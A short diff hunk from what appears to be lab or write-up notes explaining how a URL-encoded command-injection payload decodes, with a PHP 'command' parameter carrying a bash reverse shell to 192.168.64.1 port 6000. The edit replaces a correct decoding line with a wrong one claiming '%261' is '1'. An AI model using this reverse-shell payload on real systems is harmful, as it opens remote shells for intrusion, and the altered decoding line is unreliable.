@@ -100,7 +100,7 @@ f. %20 is a space
     %22 is a "double quote"
     %3E is the greater than (>) symbol
     %26 is the and (&) symbol
-    0%3E%261 is the sequence 0>&1
+    %261 is 1
 
     So it basically looks like this:
     ...php?command=bash -c "bash -i >& /dev/tcp/192.168.64.1/6000 0>&1"
